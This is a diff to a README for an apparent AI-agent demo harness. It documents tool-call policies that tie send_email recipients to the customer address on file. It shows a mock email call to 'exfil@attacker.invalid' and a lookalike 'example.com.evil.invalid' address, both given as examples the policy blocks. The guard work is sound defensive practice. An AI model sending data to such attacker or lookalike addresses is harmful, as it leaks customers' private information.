@@ -6,15 +6,17 @@ for local mock adapters and authorized testing only.
 
 - `demo_support.json` is the harness policy used by the demo agent.
 - `domain_guard.json` shows argument restrictions for email, webhooks, and notes.
-- `email_domain_confirmation.yaml` requires an explicit confirmation flag on
-  every `send_email` tool call. Adapt the mock tool to provide that flag before
-  using the policy with a local demo.
+- `email_domain_confirmation.yaml` binds every `send_email` recipient to the
+  customer's address in trusted adapter context. It works with the support
+  sample's existing `CUSTOMER_CONTEXT` without changing its mock tool.
 
-For example, this mock call violates the policy:
+For example, this mock call violates the policy because the recipient differs
+from the address on file:
 
 ```json
-{"recipient":"alex@example.test","subject":"Demo","body":"No delivery","recipient_domain_confirmed":false}
+{"recipient":"exfil@attacker.invalid","subject":"Demo","body":"No delivery"}
 ```
 
-Setting `recipient_domain_confirmed` to `true` satisfies the rule. The reserved
-`example.test` address is illustrative; no message is delivered.
+The comparison is exact, so lookalike addresses such as
+`alice@example.com.evil.invalid` also fail. These examples use mock tools only;
+no message is delivered.
